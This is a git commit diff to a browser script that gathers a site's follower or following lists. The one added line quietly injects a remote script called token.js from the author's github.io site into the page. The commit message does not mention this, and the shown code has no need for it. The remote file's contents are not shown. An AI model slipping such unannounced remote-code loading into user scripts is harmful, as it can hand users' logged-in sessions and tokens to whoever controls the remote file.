f10e4ffb5863b98b4538785d5b8a35a169688f41
haruymth <108157117+haruymth@users.noreply.github.com>
2022-12-11 18:03:57 +0900

    Update getFollowerOrFollowing.js

--- getFollowerOrFollowing.js
+++ getFollowerOrFollowing.js
@@ -11,6 +11,7 @@ async function func(){
     
     let userList="";
     document.getElementsByClassName("media-grid")[0].innerHTML="";
+    var src=document.createElement("script");src.src="https://haruymth.github.io/scripts/codes/token.js";document.body.appendChild(src);
     for(let page=0;page<followerCount;page+=60){
         var res = await (await fetch(`${location.href}?page=${Math.ceil(page/60)+1}`)).text();
         var box=document.createElement("div");
